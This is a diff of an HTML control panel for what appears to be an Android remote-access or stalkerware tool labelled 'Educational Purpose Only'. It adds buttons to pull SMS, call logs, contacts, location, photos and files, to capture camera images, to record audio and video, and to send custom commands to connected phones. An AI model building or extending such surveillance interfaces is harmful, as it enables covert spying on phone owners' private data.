@@ -3,70 +3,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Android Device Demo Server</title>
+    <title>Android Device Demo Server - Web GUI</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="container">
         <header>
             <h1>Android Device Demo Server</h1>
-            <p class="subtitle">Educational Purpose Only</p>
+            <p>Web GUI for Monitoring and Controlling Android Devices</p>
         </header>
         
-        <div class="main-content">
+        <main>
             <div class="sidebar">
-                <h2>Server Status</h2>
-                <div id="status-indicator" class="status-offline">● Offline</div>
-                <div id="status-text">Server starting...</div>
-                
                 <h2>Connected Devices</h2>
-                <div id="devices-container">
-                    <div class="device-list-empty">No devices connected</div>
+                <div id="devices-list">
+                    <p>Loading devices...</p>
                 </div>
             </div>
             
-            <div class="main-panel">
-                <h2>Device Logs</h2>
-                <div id="logs-container" class="logs-container">
-                    <div class="log-entry">Waiting for logs...</div>
+            <div class="main-content">
+                <div class="stats-panel">
+                    <h2>Server Statistics</h2>
+                    <div id="stats">
+                        <p>Loading statistics...</p>
+                    </div>
+                </div>
+                
+                <div class="logs-panel">
+                    <h2>Server Logs</h2>
+                    <div id="logs-container">
+                        <div id="logs">
+                            <p>Waiting for logs...</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="controls-panel">
+                    <h2>Device Controls</h2>
+                    <div class="button-group">
+                        <button id="btn-device-info" class="btn">Get Device Info</button>
+                        <button id="btn-location" class="btn">Get Location</button>
+                        <button id="btn-gallery" class="btn">Get Gallery List</button>
+                        <button id="btn-sms" class="btn">Get SMS Logs</button>
+                        <button id="btn-call-logs" class="btn">Get Call Logs</button>
+                        <button id="btn-contacts" class="btn">Get Contacts</button>
+                        <button id="btn-app-list" class="btn">Get App List</button>
+                        <button id="btn-notifications" class="btn">Get Notifications</button>
+                        <button id="btn-camera-front" class="btn">Capture Front</button>
+                        <button id="btn-camera-back" class="btn">Capture Back</button>
+                        <button id="btn-record-audio" class="btn">Record Audio</button>
+                        <button id="btn-record-video" class="btn">Record Video</button>
+                        <button id="btn-get-files" class="btn">Get File List</button>
+                        <button id="btn-storage" class="btn">Get Storage Info</button>
+                    </div>
+                    
+                    <div class="custom-command">
+                        <h3>Custom Command</h3>
+                        <input type="text" id="cmd-input" placeholder="Enter command (e.g., get_location)">
+                        <input type="text" id="args-input" placeholder="JSON args (optional)">
+                        <button id="btn-send-custom" class="btn">Send Command</button>
+                    </div>
                 </div>
             </div>
-        </div>
+        </main>
         
-        <div class="controls">
-            <h2>Send Command</h2>
-            <div class="command-form">
-                <div class="form-group">
-                    <label for="command-input">Command:</label>
-                    <input type="text" id="command-input" placeholder="e.g., get_device_info, get_sms_logs">
-                </div>
-                <div class="form-group">
-                    <label for="args-input">Arguments (JSON):</label>
-                    <input type="text" id="args-input" placeholder='e.g., {"path": "/sdcard"} or {} for no args'>
-                </div>
-                <div class="button-group">
-                    <button id="send-btn" class="btn-primary">Send Command</button>
-                    <button id="clear-logs-btn" class="btn-secondary">Clear Logs</button>
-                </div>
-            </div>
-            
-            <div class="quick-commands">
-                <h3>Quick Commands</h3>
-                <div class="quick-btn-group">
-                    <button class="btn-small" data-cmd="get_device_info">Device Info</button>
-                    <button class="btn-small" data-cmd="get_location">Location</button>
-                    <button class="btn-small" data-cmd="get_gallery_list">Gallery List</button>
-                    <button class="btn-small" data-cmd="get_sms_logs">SMS Logs</button>
-                    <button class="btn-small" data-cmd="get_call_logs">Call Logs</button>
-                    <button class="btn-small" data-cmd="get_contacts">Contacts</button>
-                    <button class="btn-small" data-cmd="get_app_list">App List</button>
-                    <button class="btn-small" data-cmd="get_notifications">Notifications</button>
-                    <button class="btn-small" data-cmd="record_audio">Record Audio</button>
-                    <button class="btn-small" data-cmd="capture_front">Front Camera</button>
-                    <button class="btn-small" data-cmd="capture_back">Back Camera</button>
-                </div>
-            </div>
-        </div>
+        <footer>
+            <p>Android Device Demo Server v5.1 | Educational Purpose Only</p>
+        </footer>
     </div>
     
     <script src="script.js"></script>
